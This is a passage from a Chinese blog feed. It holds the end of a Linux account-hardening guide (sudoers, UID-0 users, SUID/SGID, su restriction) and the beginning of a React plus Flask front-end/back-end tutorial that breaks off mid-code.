operator">=</span><span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> ALL<span class="token comment"># 这一行允许 admin 组的所有成员在所有主机上执行任何命令。% 符号用于表示组，而不是单个用户。</span>%sudo   <span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL:ALL<span class="token punctuation">)</span> ALL<span class="token comment"># 这一行允许 sudo 组的成员在所有主机上以任何用户身份执行任何命令。</span>@includedir /etc/sudoers.d<span class="token comment"># 这一行是一个指令，告诉 sudo 去 /etc/sudoers.d 目录下包含额外的配置文件。这些文件通常用于为个别用户或组设置更精细的权限，而不必编辑主 /etc/sudoers 文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ul><li>root    ALL=(ALL:ALL) ALL</li></ul><ol><li><strong>root</strong>：这是用户名，表示这个配置规则适用于 root 用户。</li><li><strong>ALL</strong>：这是主机（或主机组）的指定，表示这个规则适用于所有主机。当你想要为特定主机或一组主机设置权限时，你可以在这里指定主机名或使用通配符。</li><li>**=(ALL:ALL)**：这是委托（Delegation）部分，它定义了用户可以以哪些用户的身份执行命令。<ul><li>**(ALL:ALL)**：括号内的部分表示用户可以以所有用户（ALL）的身份在所有组（ALL）中执行命令。这意味着 root 用户可以切换到任何用户和组。</li></ul></li><li><strong>ALL</strong>：这是命令的指定，表示这个规则适用于所有命令。也就是说，root 用户可以执行任何命令。</li></ol><p>综合来看，这个条目意味着 root 用户在所有主机上可以以任何用户的身份执行任何命令。这是 root 用户的默认权限，通常不需要在 <code>/etc/sudoers</code> 文件中显式写出，因为 root 用户默认就有所有权限。但是，为了清晰和完整性，有时管理员会在 <code>/etc/sudoers</code> 文件中显式地声明这一点。</p><ul><li>主机的概念</li></ul><p>在 <code>/etc/sudoers</code> 文件中的 “主机”（Host）指定部分，指的是 sudo 命令可以被执行的计算机或服务器。这个概念允许管理员为不同的机器设置不同的权限规则。以下是一些具体的例子：</p><ol><li><strong>特定主机</strong>：你可以为特定的主机设置 sudo 权限。例如，<code>user host1=(ALL) ALL</code> 表示用户在名为 <code>host1</code> 的主机上可以执行任何命令。</li><li><strong>所有主机</strong>：使用 <code>ALL</code> 表示规则适用于所有主机。例如，<code>user ALL=(ALL) ALL</code> 允许用户在所有主机上执行任何命令。</li><li><strong>主机组</strong>：在某些系统中，你可以定义主机组，并为整个组设置权限。例如，如果你有一个名为 <code>webservers</code> 的主机组，你可以设置 <code>user @webservers=(ALL) ALL</code> 来允许用户在所有属于 <code>webservers</code> 组的主机上执行命令。</li><li><strong>IP 地址</strong>：你也可以使用 IP 地址来指定主机。例如，<code>user 192.168.1.100=(ALL) ALL</code> 允许用户在 IP 地址为 <code>192.168.1.100</code> 的主机上执行命令。</li><li><strong>网络范围</strong>：使用网络范围指定主机，如 <code>user 192.168.1.%=(ALL) ALL</code> 允许用户在 <code>192.168.1.</code> 网络范围内的所有主机上执行命令。</li></ol><p>在远程管理多个服务器的环境中，这种灵活性允许管理员为不同的服务器设置不同的访问控制策略，以增强安全性和管理效率。</p></blockquote><h2 id="5-3-查找除root之外uid为0的用户并将其删除"><a href="#5-3-查找除root之外uid为0的用户并将其删除" class="headerlink" title="5.3 查找除root之外uid为0的用户并将其删除"></a>5.3 查找除root之外uid为0的用户并将其删除</h2><img src="/2024/12/11/an-quan-jia-gu/linux-an-quan-jia-gu-zhi-zhang-hu-an-quan-jia-gu/%E6%88%AA%E5%B1%8F2024-12-11%2014.50.14.png" style="zoom:50%;"><blockquote><ul><li>这个命令使用 <code>awk</code> 工具来处理 <code>/etc/passwd</code> 文件。<code>/etc/passwd</code> 是一个存储系统用户账户信息的文件。</li><li><code>-F:</code> 指定了字段分隔符为冒号 <code>:</code>。</li><li><code>($3==0)</code> 是一个条件表达式，检查第三个字段（用户 ID，通常是 <code>UID</code>）是否为0。在 Unix 和类 Unix 系统中，UID 为0通常表示 root 用户。</li><li><code>{print $1}</code> 如果条件为真，则打印出第一个字段，即用户名。</li><li>但是，这个命令有一个语法错误。正确的命令应该是 <code>awk -F: '$3==0 {print $1}' /etc/passwd</code>，这样它会打印出所有 UID 为0的用户名。</li></ul></blockquote><p>如果发现test用户uid为0，将其删除：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">userdel</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-f</span> <span class="token builtin class-name">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>这个命令用于删除用户 <code>test</code>。</li><li><code>-r</code> 选项表示同时删除用户的家目录和邮件队列。</li><li><code>-f</code> 选项表示强制删除用户，即使用户当前登录也不会影响删除操作。</li></ul><h2 id="5-4-高权限文件"><a href="#5-4-高权限文件" class="headerlink" title="5.4 高权限文件"></a>5.4 高权限文件</h2><h3 id="5-4-1-检查是否有文件存在过高的权限"><a href="#5-4-1-检查是否有文件存在过高的权限" class="headerlink" title="5.4.1 检查是否有文件存在过高的权限"></a>5.4.1 检查是否有文件存在过高的权限</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-type</span> f <span class="token punctuation">\</span><span class="token punctuation">(</span> <span class="token parameter variable">-perm</span> <span class="token parameter variable">-0007</span> <span class="token punctuation">\</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token parameter variable">-I</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token function">ls</span> <span class="token parameter variable">-lh</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li><code>find / -type f</code>：从根目录 <code>/</code> 开始查找所有类型为文件的项。</li><li><code>(-perm -0007)</code>：查找权限为 7（即所有用户都有读、写、执行权限）的文件。</li><li><code>xargs -I {} ls -lh {}</code>：对找到的每个文件执行 <code>ls -lh</code> 命令，显示详细信息，包括文件权限、所有者、大小和修改日期。</li></ul></blockquote><h3 id="5-4-2-去掉所有文件的-SUID-和-SGID"><a href="#5-4-2-去掉所有文件的-SUID-和-SGID" class="headerlink" title="5.4.2 去掉所有文件的 SUID 和 SGID"></a>5.4.2 去掉所有文件的 SUID 和 SGID</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-type</span> f <span class="token punctuation">\</span><span class="token punctuation">(</span> <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-o</span> <span class="token parameter variable">-perm</span> <span class="token parameter variable">-2000</span> <span class="token punctuation">\</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token parameter variable">-I</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token function">chmod</span> ug-s <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li><code>find / -type f</code>：同样从根目录开始查找所有文件。</li><li><code>(-perm -4000 -o -perm -2000)</code>：查找设置了 SUID（4000）或 SGID（2000）位的文件。</li><li><code>xargs -I {} chmod ug-s {}</code>：对找到的每个文件执行 <code>chmod ug-s</code> 命令，移除 SUID 和 SGID 位。</li></ul></blockquote><h2 id="5-5-禁止使用任意用户-rlogin-登录"><a href="#5-5-禁止使用任意用户-rlogin-登录" class="headerlink" title="5.5 禁止使用任意用户 rlogin 登录"></a>5.5 禁止使用任意用户 rlogin 登录</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /dev/null <span class="token operator">&gt;</span> /root/.rhosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li><code>cat /dev/null</code>：创建一个空文件。</li><li><code>&gt; /root/.rhosts</code>：将这个空文件重定向到 <code>/root/.rhosts</code>。这个文件用于控制哪些远程用户可以通过 rlogin 访问 root 用户。清空这个文件可以防止任何用户通过 rlogin （远程登录）登录为 root。</li></ul><p>这些命令用于增强系统的安全性，通过限制权限和控制访问来减少潜在的安全风险。</p></blockquote><h2 id="5-6-启动脚本文件权限管理"><a href="#5-6-启动脚本文件权限管理" class="headerlink" title="5.6 启动脚本文件权限管理"></a>5.6 启动脚本文件权限管理</h2><ol><li><strong>任务描述</strong>：检查并修复启动脚本文件权限，以防止潜在的安全漏洞，如未授权访问或恶意软件（木马）的植入。</li><li><strong>命令和输出</strong>：<ul><li><code>ls -l /etc/rc.d/init.d</code>：列出 <code>/etc/rc.d/init.d</code> 目录下的所有文件及其权限。这个目录通常包含系统启动时运行的脚本。</li><li>输出显示了多个文件的权限，其中一些文件具有 <code>rwx</code>（读、写、执行）权限，这意味着所有用户都可以执行这些脚本，这可能是一个安全风险。</li></ul></li><li><strong>修复命令</strong>：<ul><li><code>chmod 700 /etc/rc.d/init.d/*</code>：将 <code>/etc/rc.d/init.d</code> 目录下所有文件的权限更改为 <code>700</code>，这意味着只有文件所有者（通常是 root）可以读取、写入和执行这些文件，增强安全性。</li></ul></li></ol><h2 id="5-7-限制用户使用-su-切换到-root"><a href="#5-7-限制用户使用-su-切换到-root" class="headerlink" title="5.7 限制用户使用 su 切换到 root"></a>5.7 限制用户使用 <code>su</code> 切换到 root</h2><ol><li><strong>任务描述</strong>：配置系统以限制只有特定组（如 wheel 组）的用户才能使用 <code>su</code> 命令切换到 root 用户。</li><li><strong>配置步骤</strong>：<ul><li>编辑 <code>/etc/pam.d/su</code> 文件，添加 <code>auth required pam_wheel.so group=wheel</code>。这行配置确保只有 wheel 组的成员才能使用 <code>su</code> 命令切换到 root。</li></ul></li><li><strong>验证步骤</strong>：<ul><li>使用 <code>grep wheel /etc/group</code> 检查 wheel 组的成员。输出显示 <code>zhangsan</code> 是 wheel 组的成员。</li><li>尝试使用 <code>su -l root</code> 命令切换到 root 用户。<code>zhangsan</code> 成功切换到 root，而 <code>lisi</code> 因为不是 wheel 组的成员，尝试失败并收到 “Permission denied” 的消息。</li></ul></li></ol><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>Linux系统账户安全加固对于保护服务器和数据至关重要。通过限制SUID和SGID位，可以防止恶意程序获取过高权限；严格管理文件权限，避免未授权访问；使用<code>chmod</code>命令限制启动脚本的访问权限，防止恶意代码执行。此外，通过配置<code>/etc/pam.d/su</code>文件，限制只有特定用户组能使用<code>su</code>切换到root，进一步增强安全性。这些措施共同构建了一个更加安全的环境，防止未授权访问、数据泄露和系统被恶意软件感染，确保系统稳定性和数据完整性。</p>]]></content>
      
      
      <categories>
          
          <category> 安全加固 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全加固 </tag>
            
            <tag> Linux安全加固 </tag>
            
            <tag> 账户安全加固 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React+Flask前后端分离开发</title>
      <link href="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/"/>
      <url>/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="一、动机"><a href="#一、动机" class="headerlink" title="一、动机"></a>一、动机</h1><p>通过 <strong>React</strong>（前端框架）和 <strong>Flask</strong>（后端框架）构建一个初始网站，可以结合它们的优势，前端负责交互界面，后端提供 API 接口。</p><h1 id="二、准备环境"><a href="#二、准备环境" class="headerlink" title="二、准备环境"></a>二、准备环境</h1><h2 id="2-1-安装必要工具"><a href="#2-1-安装必要工具" class="headerlink" title="2.1 安装必要工具"></a>2.1 安装必要工具</h2><ul><li>确保安装了 <a href="https://nodejs.org/">Node.js</a> 和 npm，用于管理 React 项目。</li><li>确保安装了 Python（推荐 3.8 及以上版本）和 pip，用于管理 Flask 项目。</li></ul><blockquote><h3 id="npm是什么？"><a href="#npm是什么？" class="headerlink" title="npm是什么？"></a>npm是什么？</h3><p>npm 是 Node Package Manager（节点包管理器）的缩写，它是 JavaScript 运行时环境 Node.js 的默认包管理器。</p><p>npm 用于管理和安装 Node.js 应用程序所需的各种代码库和工具，这些代码库和工具被称为“包”或“模块”。</p><p>以下是 npm 的一些主要功能：</p><ol><li><strong>依赖管理</strong>：npm 允许你为你的项目定义依赖关系，并通过 <code>package.json</code> 文件来管理这些依赖。这使得项目可以轻松地在不同的开发环境中共享和部署。</li><li><strong>包安装</strong>：你可以使用 npm 来安装项目所需的包。这些包可以是第三方库，也可以是你自己的代码模块。</li><li><strong>版本控制</strong>：npm 支持语义化版本控制，允许你指定依赖的版本范围，以确保兼容性。</li><li><strong>包发布</strong>：开发者可以将自己的包发布到 npm 的公共仓库，供其他开发者使用。</li><li><strong>全局安装</strong>：npm 允许你全局安装包，这样你就可以在任何地方使用这些工具，而不需要在每个项目中单独安装。</li><li><strong>脚本</strong>：<code>package.json</code> 文件中的 <code>scripts</code> 字段允许你定义自定义脚本，这些脚本可以通过 <code>npm run &lt;script-name&gt;</code> 来执行。</li><li><strong>工作区</strong>：npm 支持工作区，允许你在多个包之间共享配置和依赖。</li></ol></blockquote><h1 id="三、创建-Flask-后端"><a href="#三、创建-Flask-后端" class="headerlink" title="三、创建 Flask 后端"></a>三、创建 Flask 后端</h1><h2 id="3-1-创建-Flask-项目"><a href="#3-1-创建-Flask-项目" class="headerlink" title="3.1 创建 Flask 项目"></a>3.1 创建 Flask 项目</h2><p>初始化 Flask 项目目录：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> flask-backend<span class="token builtin class-name">cd</span> flask-backend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="3-2-创建虚拟环境并激活"><a href="#3-2-创建虚拟环境并激活" class="headerlink" title="3.2 创建虚拟环境并激活"></a>3.2 创建虚拟环境并激活</h2><p>conda 或 venv</p><h3 id="3-2-1-anaconda"><a href="#3-2-1-anaconda" class="headerlink" title="3.2.1 anaconda"></a>3.2.1 anaconda</h3><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-09%2017.27.59.png" style="zoom:50%;"><h3 id="3-2-2-venv"><a href="#3-2-2-venv" class="headerlink" title="3.2.2 venv"></a>3.2.2 venv</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-m</span> venv venv<span class="token builtin class-name">source</span> venv/bin/activate   <span class="token comment"># Windows: venv\Scripts\activate</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-2-3-安装-Flask"><a href="#3-2-3-安装-Flask" class="headerlink" title="3.2.3 安装 Flask"></a>3.2.3 安装 Flask</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> flask<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-4-创建-app-py-文件"><a href="#3-2-4-创建-app-py-文件" class="headerlink" title="3.2.4 创建 app.py 文件"></a>3.2.4 创建 <code>app.py</code> 文件</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> jsonifyapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/api/message'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Hello from Flask!"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-2-5-启动-Flask-服务器"><a href="#3-2-5-启动-Flask-服务器" class="headerlink" title="3.2.5 启动 Flask 服务器"></a>3.2.5 启动 Flask 服务器</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python app.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-09%2017.34.25.png" style="zoom:50%;"><p>访问 <code>http://127.0.0.1:5000/api/message</code>：</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-09%2017.35.40.png" style="zoom:50%;"><h1 id="四、创建-React-前端"><a href="#四、创建-React-前端" class="headerlink" title="四、创建 React 前端"></a>四、创建 React 前端</h1><h2 id="4-1-初始化-React-项目"><a href="#4-1-初始化-React-项目" class="headerlink" title="4.1 初始化 React 项目"></a>4.1 初始化 React 项目</h2><p>在另一个目录中创建 React 项目</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">npx create-react-app react-frontend<span class="token builtin class-name">cd</span> react-frontend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><ul><li>命令解析：</li></ul><p>**<code>npx</code>**是 npm 的一部分，用于运行 npm 包而无需全局安装它们。</p><p>**<code>create-react-app</code>**是 React 官方提供的脚手架工具，用于快速搭建 React 项目的初始结构。</p><p>**<code>react-frontend</code>**是项目的目录名称，你可以根据需要自定义，例如 <code>my-react-app</code>。</p></blockquote><blockquote><p> 报错：</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-09%2017.44.29.png" alt="截屏2024-12-09 17.44.29" style="zoom:50%;"><p>try：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> config <span class="token builtin class-name">set</span> legacy-peer-deps <span class="token boolean">true</span><span class="token function">npm</span> i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>参考：<a href="https://stackoverflow.com/questions/72596908/could-not-resolve-dependency-error-peer-react16-8-0-17-0-0-from-materia">https://stackoverflow.com/questions/72596908/could-not-resolve-dependency-error-peer-react16-8-0-17-0-0-from-materia</a></p><p><code>npm config set legacy-peer-deps true</code></p><p>这条命令用于配置 <strong>npm</strong> 使用 “legacy peer dependencies” 机制来解决依赖冲突。具体来说：</p><ol><li><strong><code>peer dependencies</code></strong><br>是指某个 npm 包对其他包的版本要求，它并不直接安装这些依赖，而是由使用该包的项目来安装。它用于确保在多个包中共享同一版本的依赖。</li><li><strong>“legacy peer dependencies”</strong><br>在 npm 7 版本及之后，npm 会强制执行严格的 <code>peer dependencies</code> 规则。若存在不兼容的版本，npm 会拒绝安装。这可能导致一些旧项目的依赖安装失败，特别是一些老旧的 npm 包没有更新以适应这些新规则。</li><li><strong><code>npm config set legacy-peer-deps true</code></strong><br>这条命令设置 npm 配置，指示 npm 在安装时忽略 <code>peer dependencies</code> 的严格检查，允许安装不完全匹配的版本。这对于那些依赖较旧的 npm 包（或者在升级后依赖有冲突的情况）特别有用。</li></ol><p><code>npm i</code> (或 <code>npm install</code>)**</p><p>这是用于安装项目依赖的命令，它会按照项目根目录下的 <code>package.json</code> 文件来安装所有列出的依赖。</p><ul><li>在执行 <code>npm i</code> 时，npm 会下载并安装依赖到项目的 <code>node_modules</code> 目录。</li><li>如果你在之前执行过 <code>npm config set legacy-peer-deps true</code>，npm 会在安装过程中忽略 <code>peer dependencies</code> 的严格检查，允许版本冲突的依赖继续安装。</li></ul></blockquote><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-09%2017.51.41.png" style="zoom:40%;"><p>启动服务并访问测试：</p><p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2009.18.39.png" alt="截屏2024-12-10 09.18.39"></p><p>bug处理：</p><blockquote><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2009.21.15.png" alt="截屏2024-12-10 09.21.15" style="zoom:50%;"><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-09%2017.53.02.png" alt="截屏2024-12-09 17.53.02" style="zoom:50%;"><p>安装缺失的库。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">npm install <span class="token operator">--</span>save<span class="token operator">-</span>dev web<span class="token operator">-</span>vitals<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>重新运行npm start启动前端项目。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2009.22.17.png" style="zoom:30%;"><h2 id="4-2-修改-React-项目以调用-Flask-API"><a href="#4-2-修改-React-项目以调用-Flask-API" class="headerlink" title="4.2 修改 React 项目以调用 Flask API"></a>4.2 修改 React 项目以调用 Flask API</h2><h3 id="4-2-1-安装-axios（用于发起-HTTP-请求）"><a href="#4-2-1-安装-axios（用于发起-HTTP-请求）" class="headerlink" title="4.2.1 安装 axios（用于发起 HTTP 请求）"></a>4.2.1 安装 <code>axios</code>（用于发起 HTTP 请求）</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> axios<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2009.27.40.png" style="zoom:50%;"><h3 id="4-2-2-在-src-App-js-中编辑代码"><a href="#4-2-2-在-src-App-js-中编辑代码" class="headerlink" title="4.2.2 在 src/App.js 中编辑代码"></a>4.2.2 在 <code>src/App.js</code> 中编辑代码</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> React<span class="token punctuation">,</span> <span class="token punctuation">{</span> useState<span class="token punctuation">,</span> useEffect <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span><span class="token keyword">import</span> axios <span class="token keyword">from</span> <span class="token string">'axios'</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token punctuation">[</span>message<span class="token punctuation">,</span> setMessage<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>        <span class="token comment">// 调用 Flask API</span>        axios<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'http://127.0.0.1:5000/api/message'</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=&gt;</span> <span class="token function">setMessage</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>data<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">error</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"Error fetching data:"</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>        <span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token literal-property property">textAlign</span><span class="token operator">:</span> <span class="token string">'center'</span><span class="token punctuation">,</span> <span class="token literal-property property">marginTop</span><span class="token operator">:</span> <span class="token string">'50px'</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>h1<span class="token operator">&gt;</span>React <span class="token operator">+</span> Flask 初始页面<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span><span class="token punctuation">{</span>message <span class="token operator">||</span> <span class="token string">"Loading..."</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>        <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ul><li>代码解析：</li></ul><p> 这段代码是一个简单的 React 组件，它使用 axios 库从一个 Flask API 获取数据。下面是代码的逐行解释：</p><ol><li><p>import React, { useState, useEffect } from ‘react’;<br>这行代码从 react 库中导入了 React 对象、useState 钩子和 useEffect 钩子。useState 用于在函数组件中添加状态，useEffect 用于处理副作用（例如，数据获取、订阅或手动更改 React 组件中的 DOM）。</p></li><li><p>import axios from ‘axios’;<br>这行代码导入了 axios，这是一个基于 Promise 的 HTTP 客户端，用于浏览器和 node.js，用于向后端发送请求。</p></li><li><p>function App() { … }<br>定义了一个名为 App 的函数组件。</p></li><li><p>const [message, setMessage] = useState(‘’);<br>使用 useState 钩子创建了一个名为 message 的状态变量和一个名为 setMessage 的函数，用于更新这个状态。初始值设置为空字符串。</p></li><li><p>useEffect(() =&gt; { … }, []);<br>useEffect 钩子用于在组件加载后执行副作用。这里的效果是调用 Flask API 获取消息。空数组 [] 作为第二个参数表示这个效果仅在组件首次渲染时运行。</p></li><li><p>axios.get(‘<a href="http://127.0.0.1:5000/api/message">http://127.0.0.1:5000/api/message</a>‘)<br>使用 axios 发送一个 GET 请求到 <a href="http://127.0.0.1:5000/api/message">http://127.0.0.1:5000/api/message</a> 这个 URL。这个 URL 应该是你的 Flask 应用提供的 API 端点。</p></li><li><p>.then(response =&gt; setMessage(response.data.message))<br>如果请求成功，.then 方法会处理响应。这里将响应中的 message 数据赋值给状态变量 message。</p></li><li><p>.catch(error =&gt; console.error(“Error fetching data:”, error));<br>如果请求失败，.catch 方法会捕获错误，并在控制台打印错误信息。</p></li><li><p>return ( … );<br>这是 React 组件的返回语句，它定义了组件的 JSX 结构，即组件在页面上呈现的内容。</p></li><li><pre><code class="html">&lt;div style={{ textAlign: 'center', marginTop: '50px' }}&gt; ... &lt;/div&gt;<pre class="line-numbers language-none"><code class="language-none">    + 返回一个 div 元素，其中包含一些内联样式：文本居中和上边距为 50px。11. ```html    &lt;h1&gt;React + Flask 初始页面&lt;/h1&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>+ 在 div 内部，有一个标题元素 h1，显示文本 “React + Flask 初始页面”。</code></pre></li><li><pre><code class="html">&lt;p&gt;{message || "Loading..."}&lt;/p&gt;<pre class="line-numbers language-none"><code class="language-none">    + 一个段落元素 p 显示 message 状态的值。如果 message 是空的（即正在加载中），则显示 “Loading…”。      整体来看，这段代码创建了一个 React 组件，该组件在加载时从 Flask API 获取一条消息，并将其显示在页面上。如果消息尚未加载，页面将显示 “Loading…”。&lt;img src="React+Flask%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%BC%80%E5%8F%91/%E6%88%AA%E5%B1%8F2024-12-10%2009.49.10.png" alt="截屏2024-12-10 09.49.10" style="zoom:50%;" /&gt;### 4.2.3 访问测试![截屏2024-12-10 09.53.06](React+Flask%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%BC%80%E5%8F%91/%E6%88%AA%E5%B1%8F2024-12-10%2009.53.06.png)前端执行成功，但是后端的message数据请求失败。原因：同源策略限制（React端口3000，Flask端口5000）。# 五、跨域请求设置## 5.1 设置 Flask 支持跨域请求安装 Flask-CORS：```bashpip install flask-cors<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></code></pre></li></ol></blockquote><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2009.56.47.png" style="zoom:50%;"><p>修改 <code>app.py</code>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask_cors <span class="token keyword">import</span> CORSapp <span class="token 